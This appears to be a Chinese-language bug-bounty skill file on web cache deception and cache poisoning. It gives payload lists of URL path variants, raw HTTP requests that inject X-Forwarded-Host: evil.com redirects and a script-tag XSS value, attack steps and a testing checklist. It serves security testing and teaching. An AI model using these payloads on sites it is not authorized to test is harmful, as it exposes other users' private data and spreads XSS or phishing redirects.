---
name: cache-deception
description: CWE: CWE-441 / CWE-524 | OWASP: WSTG-CONF-08 (变体) / A05:2021 核心: CDN / 反代 / Varnish / Nginx FastCGI cache 把动态页面当成静态资源缓存, 导致其他用户访问到受害者的敏感数据;…
category: vuln
---

# Web Cache Deception / Cache Poisoning 深度手册

← 回主入口 [../../SKILL.md](../../SKILL.md)

> **CWE**: CWE-441 / CWE-524 | **OWASP**: WSTG-CONF-08 (变体) / A05:2021
> **核心**: CDN / 反代 / Varnish / Nginx FastCGI cache 把动态页面当成静态资源缓存, 导致**其他用户**访问到**受害者**的敏感数据; 或攻击者注入恶意响应被缓存发给所有用户
> **赏金**: 高, $2000-$15000 (批量泄露或全站投毒场景)

---

## 0. First-pass Payload Set

### Cache Deception (偷受害者数据)

```
# 原始 URL: /profile    (动态页, 返回当前用户信息)
# 污染 URL:
/profile.css
/profile.js
/profile/foo.css
/profile;foo.css
/profile%0Afoo.css
/profile/%2e%2e/foo.css
/profile/a.png?v=1
```

### Cache Poisoning (注入全站)

```
# 往 unkeyed header 注入, 响应被缓存
GET /home HTTP/1.1
X-Forwarded-Host: evil.com
X-Forwarded-Scheme: http
X-Original-URL: /admin
```

---

## 1. 两大家族的区别

| 维度 | Cache Deception | Cache Poisoning |
|------|-----------------|-----------------|
| 谁放 | 受害者访问时, 被缓存了**他自己的**敏感页面 | 攻击者主动投毒, 缓存里是**攻击者构造的**响应 |
| 谁拿 | 其他任何访问该 URL 的人 (甚至未登录) | 后续所有访问该 URL 的用户 |
| 触发 | URL 路径污染 (加扩展) | 修改 unkeyed header |
| 影响 | 数据泄露 (个人信息 / CSRF token) | 全站 XSS / 钓鱼跳转 / 内容篡改 |
| 典型 CDN | Akamai / Cloudflare / Fastly / Varnish | 同 |

---

## 2. Cache Deception 详解

### 2.1 原理

1. CDN 规则: `*.css` / `*.js` / `*.png` / `*.woff2` 等静态扩展 → 缓存
2. 后端 Web 服务器 (Nginx/Tomcat/Apache): 路径匹配时 `/profile.css` 被规范化 / 路由到 `/profile`
3. 受害者登录后访问 `https://target.com/profile.css` → 后端返回 `profile` 页面 (带受害者敏感数据)
4. CDN 缓存这个响应, key = `/profile.css`
5. 攻击者未登录访问 `https://target.com/profile.css` → CDN 命中缓存 → 看到受害者数据

### 2.2 URL 变体 (按常见 CDN 顺序)

```
/profile/nonexistent.css
/profile/nonexistent.js
/profile/nonexistent.jpg
/profile;nonexistent.css              # 分号绕路径
/profile;.css
/profile%2f.css                        # URL 编码 /
/profile%00.css                        # null byte
/profile%0a.css                        # newline
/profile%3f.css                        # ? URL 编码
/profile/..%2f..%2fstatic.css          # 路径穿越
/profile#/../x.css                     # fragment 不被发送, 但 Nginx normalize_path 可能处理
/profile/.css
/profile..css
```

### 2.3 各 CDN / 反代 的缓存规则

| 平台 | 静态扩展缓存 | 路径规范化 |
|------|-------------|-----------|
| **Cloudflare** | 默认 40+ 扩展 (css/js/jpg/png/gif/woff2...) | 默认不规范化 |
| **Akamai** | 可配置 | 可选 | 
| **Fastly** | VCL 规则决定 | 可选 |
| **Varnish** | 默认按扩展 | 默认不规范化 |
| **Nginx proxy_cache** | `proxy_cache_key` 自定义 | `merge_slashes on` 默认 |
| **Apache mod_cache** | `CacheEnable` 配置 | 默认规范化 |
| **AWS CloudFront** | 默认按扩展 | 可选 `forward-query-strings` |

### 2.4 攻击步骤 (标准化)

```
1. 以账号 A 登录, 访问 /profile.css
   → 记录响应: 是否命中缓存 (Cache: HIT/MISS header)
   → 响应是否包含 A 的敏感数据 (email/phone/CSRF token)

2. 退出登录 / 用无痕浏览器访问同一 URL
   → 若看到 A 的数据, 确认漏洞

3. 扩展测: 换 20 种路径变体, 找最稳的

4. 确认: 清缓存后重试, 区分偶然 / 漏洞
```

---

## 3. Cache Poisoning 详解

### 3.1 Unkeyed Header 是核心

Cache key 通常 = method + path + query string + Host, 但不包含 body 或其他 header。
**Unkeyed header**: 不影响缓存 key, 但影响响应内容 → 可被投毒。

常见 unkeyed headers:

```
X-Forwarded-Host        → 影响应用生成的绝对 URL
X-Forwarded-For         → 可能被记录到响应 / 日志
X-Forwarded-Scheme      → 影响 HTTP/HTTPS 生成
X-Host                  → 变体
X-Original-URL          → IIS
X-Rewrite-URL           → Symfony
X-Forwarded-Server      → Apache
Authorization           → 某些场景不进 key 但影响响应
Cookie (单个字段)        → 需要 vary: cookie 才算 key
```

### 3.2 探测 unkeyed header 存在

**Param Miner** (Burp 插件) 自动测:
- Extensions → Param Miner → Guess headers
- 对目标 URL 批量加测试 header, 看响应哪个被改变

**手工**:
```http
GET / HTTP/1.1
Host: target.com
X-Forwarded-Host: <unique-value>-123

# 看响应里是否出现 <unique-value>-123 (如 redirect URL / html link)
```

### 3.3 典型攻击

#### Redirect 投毒

```http
GET /login HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.com
```

响应: `Location: https://evil.com/login?redirect=...`
被缓存 → 其他用户访问 `/login` 直接跳转 evil.com。

#### XSS 投毒

```http
GET / HTTP/1.1
Host: target.com
X-Forwarded-Host: "><script>alert(1)</script>
```

若服务端把 Host 反射到 HTML: `<link rel=canonical href="https://X-Forwarded-Host/">` → XSS 被缓存。

#### HTTP Method Override → 动作缓存

```http
GET / HTTP/1.1
Host: target.com
X-HTTP-Method-Override: POST
```

某些应用按 override 执行 POST 逻辑, 但缓存按 GET method 做 key → 后续 GET 触发 POST 副作用的缓存响应。

---

## 4. Cache Key 碰撞 (高阶)

### 4.1 Fat GET

用 GET 带 body. 有些缓存忽略 body, 但后端用 body 做逻辑:
```http
GET /search?q=safe HTTP/1.1

payload_body
```

### 4.2 Keyed vs Unkeyed 差异

- Cache 按 `/path` 做 key
- 后端按 `Accept-Language` / `User-Agent` 返回不同内容
- 强制某 Accept 后响应被缓存, 后续所有请求都拿到同一语言版本 → 非关键但可用

### 4.3 Parameter Cloaking

```
?utm_source=twitter&:utm_source=evil
```

某些反代把 `:param` 丢掉, 后端保留 → 缓存 key 差异。

---

## 5. Testing Checklist

### Cache Deception
- [ ] 测 20 种扩展变体 (.css / .js / .png / .jpg / .woff2 / .ico)
- [ ] 测分隔符 (`/` `;` `%2f` `%00` `%0a` `%3f`)
- [ ] 测路径穿越 (`/..%2f.css`)
- [ ] 登录后访问, 对比未登录访问响应
- [ ] 检查 `Cache-Control` / `X-Cache` / `Age` / `CF-Cache-Status` header
- [ ] 测不同 CDN 节点 (某些节点缓存, 某些不)

### Cache Poisoning
- [ ] Param Miner 跑 unkeyed headers 检测
- [ ] `X-Forwarded-Host` / `X-Host` / `X-Original-URL` 重点
- [ ] 观察响应是否反射这些 header 的值 (HTML / redirect / JSON)
- [ ] 尝试注入 XSS payload / redirect to evil
- [ ] 确认缓存 key: 同一 URL 多次请求加不同 header, 看缓存是否按路径命中

---

## 6. False Positive Traps

| 陷阱 | 真相 |
|------|------|
| `/profile.css` 返回 404 | CDN 或后端拦, 非漏洞; 换变体 |
| 登录后访问但无 `Cache: HIT` | 当前响应未被缓存, 可能 `Cache-Control: private` 生效 |
| Poisoning 后无用户被影响 | 缓存 TTL 短 / CDN 节点分散 |
| X-Forwarded-Host 改变响应但未进缓存 | header 实际是 keyed, 不能投毒 |
| CDN 返回 `Age: 0` | 刚 MISS, 非缓存命中 |

---

## 7. 影响证明

### Cache Deception
- **低**: 能返回自己的 profile 作为"缓存" (无他人泄露)
- **中**: 退出后用他人账号访问, 看到部分数据 (需多步验证)
- **高**: 未登录 + 无痕访问拿到受害者 email / phone / 隐藏 input / CSRF token
- **严重**: 批量爬取 `/profile.css` 几个小时, 积累多个受害者数据

### Cache Poisoning
- **低**: 能投毒自己会话
- **中**: 跨用户投毒, 但影响范围小 (特定 CDN 节点)
- **高**: 全站 XSS 通过一次投毒传播
- **严重**: redirect 投毒配合 OAuth → 批量账号接管

---

## 8. 相关参考

- 主入口 → [../../SKILL.md](../../SKILL.md)
- Host Header 攻击 → [host-header.md](host-header.md)
- CORS / 原始 CSV 注入 → [cors-cache.md](cors-cache.md)
- HTTP 请求走私 (与缓存投毒常组合) → [request-smuggling.md](request-smuggling.md)

---

**CWE**: CWE-441 / CWE-524 | **WSTG**: CONF-08 | **CVSS 典型**: 7.5 (Cache Deception 批量泄露) / 8.6 (Cache Poisoning 全站 XSS)
